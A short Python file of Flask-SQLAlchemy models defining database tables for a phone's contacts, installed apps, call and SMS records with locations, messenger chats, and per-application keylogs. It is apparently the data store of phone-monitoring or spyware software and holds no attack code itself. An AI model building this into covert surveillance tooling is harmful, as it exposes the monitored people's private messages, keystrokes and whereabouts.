
from db import db

class Contact(db.Model):
    __tablename__ = 'Contacts'
    contact_id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.Text, nullable=False)
    phone_number = db.Column(db.Text)
    email = db.Column(db.Text)
    last_contacted = db.Column(db.DateTime)

class InstalledApp(db.Model):
    __tablename__ = 'InstalledApps'
    app_id = db.Column(db.Integer, primary_key=True)
    application_name = db.Column(db.Text, nullable=False)
    package_name = db.Column(db.Text, nullable=False)
    install_date = db.Column(db.DateTime)

class Call(db.Model):
    __tablename__ = 'Calls'
    call_id = db.Column(db.Integer, primary_key=True)
    call_type = db.Column(db.Text, nullable=False)
    time = db.Column(db.DateTime, nullable=False)
    from_to = db.Column(db.Text)
    duration = db.Column(db.Integer, default=0)
    location = db.Column(db.Text)

class SMS(db.Model):
    __tablename__ = 'SMS'
    sms_id = db.Column(db.Integer, primary_key=True)
    sms_type = db.Column(db.Text, nullable=False)
    time = db.Column(db.DateTime, nullable=False)
    from_to = db.Column(db.Text)
    text = db.Column(db.Text)
    location = db.Column(db.Text)

class ChatMessage(db.Model):
    __tablename__ = 'ChatMessages'
    message_id = db.Column(db.Integer, primary_key=True)
    messenger = db.Column(db.Text, nullable=False)
    time = db.Column(db.DateTime, nullable=False)
    sender = db.Column(db.Text)
    text = db.Column(db.Text)

class Keylog(db.Model):
    __tablename__ = 'Keylogs'
    keylog_id = db.Column(db.Integer, primary_key=True)
    application = db.Column(db.Text, nullable=False)
    time = db.Column(db.DateTime, nullable=False)
    text = db.Column(db.Text)
